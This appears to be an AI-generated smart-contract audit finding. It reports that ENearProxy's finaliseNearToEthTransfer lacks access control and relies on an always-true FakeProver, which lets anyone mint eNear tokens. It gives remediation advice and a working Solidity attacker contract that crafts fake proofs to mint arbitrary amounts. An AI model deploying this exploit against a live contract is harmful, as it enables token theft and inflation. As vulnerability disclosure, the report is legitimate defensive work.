The README is the decisive piece of evidence here. Let me trace the full attack path carefully.

### Title
Unauthorized eNear Token Minting via Unguarded `ENearProxy.finaliseNearToEthTransfer` with `FakeProver` — (`evm/src/eNear/contracts/ENearProxy.sol`)

---

### Summary

`ENearProxy.finaliseNearToEthTransfer` has no access control and is configured with `FakeProver` as its prover in the intended production deployment. Any attacker can craft proof data with an unused receipt ID and arbitrary recipient/amount, pass the always-true prover check, and cause eNear to mint tokens to themselves. eNear's `usedEvents` replay guard is the only barrier, but it only blocks the same receipt ID — it does not prevent crafted proofs with fresh IDs.

---

### Finding Description

The README explicitly documents the intended production configuration:

> "We will make `eNearProxy` the admin of `eNear` and replace the `Prover` with a `FakeProver` that will successfully verify any proof." [1](#0-0) 

`FakeProver.proveOutcome` unconditionally returns `true` for any input: [2](#0-1) 

`ENearProxy.finaliseNearToEthTransfer` is `external` with only a pause gate — no role check, no caller restriction: [3](#0-2) 

The complete proof format is visible in the `mint` function, which constructs fake proofs with a controlled `currentReceiptId`, `amount`, and `to` address: [4](#0-3) 

The test suite confirms that when ENearProxy is set as eNear's admin, it can call `eNear.finaliseNearToEthTransfer` even when eNear's own pause flags are set — the admin bypasses the pause: [5](#0-4) 

---

### Impact Explanation

An attacker can mint an unbounded quantity of eNear tokens to any address without holding `MINTER_ROLE` or any other privilege. The attack path:

1. Attacker calls `ENearProxy.finaliseNearToEthTransfer(craftedProofData, 0)`.
2. `FakeProver.proveOutcome(craftedProofData, 0)` returns `true`.
3. `eNear.finaliseNearToEthTransfer(craftedProofData, 0)` executes — ENearProxy is eNear's admin, so eNear's own pause is bypassed.
4. eNear parses the crafted proof, extracts the receipt ID, checks `usedEvents` — the fresh ID is not present, so the check passes.
5. eNear mints the attacker-specified `amount` to the attacker-specified `to` address.

This is unauthorized minting / balance manipulation — Critical impact.

---

### Likelihood Explanation

- `FakeProver` is the explicitly documented production prover for ENearProxy.
- The proof format is fully public (visible in `ENearProxy.mint`).
- No special role, key, or privileged position is required.
- The only prerequisite is choosing a receipt ID not already in eNear's `usedEvents` (trivially satisfied by using any large integer).
- `PAUSED_LEGACY_FIN_TRANSFER` is not set by default; the legacy path is intentionally left open for old proofs. [6](#0-5) 

---

### Recommendation

Either:

1. **Immediately pause the legacy path** by calling `ENearProxy.pauseAll()` after deployment, permanently closing `finaliseNearToEthTransfer` on ENearProxy once all legitimate legacy proofs have been processed.
2. **Add access control** to `ENearProxy.finaliseNearToEthTransfer` (e.g., `onlyRole(MINTER_ROLE)`) so only authorized callers can invoke the legacy path.
3. **Use a real prover** for ENearProxy's `prover` field instead of `FakeProver`, so crafted proof data cannot pass the prover check.

The root cause is the combination of (a) no access control on the legacy path and (b) a prover that accepts any input.

---

### Proof of Concept

```solidity
// Attacker contract — no special privileges needed
contract AttackENearProxy {
    ENearProxy proxy;
    bytes nearConnector; // read from proxy.nearConnector()

    function exploit(address victim) external {
        uint256 fakeReceiptId = type(uint256).max; // unused ID
        uint128 amount = 1_000_000 ether;          // arbitrary

        bytes memory craftedProof = bytes.concat(
            new bytes(72),
            hex"01000000",
            abi.encodePacked(fakeReceiptId),        // unused receipt ID
            new bytes(24),
            abi.encodePacked(
                Borsh.swapBytes4(uint32(nearConnector.length))
            ),
            abi.encodePacked(nearConnector),
            hex"022500000000",
            abi.encodePacked(Borsh.swapBytes16(amount)),
            abi.encodePacked(victim),               // attacker's address
            new bytes(280)
        );

        // No role required; FakeProver returns true; eNear mints to victim
        proxy.finaliseNearToEthTransfer(craftedProof, 0);
    }
}
```

Expected result: eNear balance of `victim` increases by `amount` with no authorization. The call succeeds because `FakeProver` approves any proof and the fresh receipt ID is not in eNear's `usedEvents`. [3](#0-2) [7](#0-6)

### Citations

**File:** evm/src/eNear/README.md (L17-20)
```markdown
We will make `eNearProxy` the admin of `eNear` and replace the `Prover` with a `FakeProver` 
that will successfully verify any proof. 
We will pause the `finaliseNearToEthTransfer` and `transferToNear` functions, 
and only `eNearProxy`, as the admin, will have the ability to call these functions.
```

**File:** evm/src/eNear/contracts/FakeProver.sol (L6-9)
```text
contract FakeProver is INearProver {
    function proveOutcome(bytes calldata, uint64) external pure returns (bool) {
        return true;
    }
```

**File:** evm/src/eNear/contracts/ENearProxy.sol (L26-26)
```text
    uint256 constant PAUSED_LEGACY_FIN_TRANSFER = 1 << 0;
```

**File:** evm/src/eNear/contracts/ENearProxy.sol (L58-72)
```text
        bytes memory fakeProofData = bytes.concat(
            new bytes(72),
            hex"01000000",
            abi.encodePacked(currentReceiptId),
            new bytes(24),
            abi.encodePacked(Borsh.swapBytes4(uint32(nearConnector.length))),
            abi.encodePacked(nearConnector),
            hex"022500000000",
            abi.encodePacked(Borsh.swapBytes16(amount)),
            abi.encodePacked(to),
            new bytes(280)
        );

        currentReceiptId += 1;
        eNear.finaliseNearToEthTransfer(fakeProofData, 0);
```

**File:** evm/src/eNear/contracts/ENearProxy.sol (L80-90)
```text
    function finaliseNearToEthTransfer(
        bytes memory proofData,
        uint64 proofBlockHeight
    ) external whenNotPaused(PAUSED_LEGACY_FIN_TRANSFER) {
        require(
            prover.proveOutcome(proofData, proofBlockHeight),
            "Proof should be valid"
        );

        eNear.finaliseNearToEthTransfer(proofData, proofBlockHeight);
    }
```

**File:** evm/tests/eNearProxy.test.ts (L126-141)
```typescript
    it("Pause All", async () => {
      await eNear.connect(eNearAdmin).adminPause(PAUSE_TRANSFER_TO_NEAR | PAUSE_FINALISE_FROM_NEAR)

      await eNearProxy
        .connect(deployer)
        .grantRole(ethers.keccak256(ethers.toUtf8Bytes("MINTER_ROLE")), alice.address)
      await expect(eNearProxy.connect(alice).mint(await eNear.getAddress(), alice.address, 100)).to
        .be.reverted
      expect(await eNear.balanceOf(alice.address)).to.equal(0)

      await eNear
        .connect(eNearAdmin)
        .adminSstore(9, ethers.zeroPadValue(await eNearProxy.getAddress(), 32))
      await eNearProxy.connect(alice).mint(await eNear.getAddress(), alice.address, 100)
      expect(await eNear.balanceOf(alice.address)).to.equal(100)
    })
```
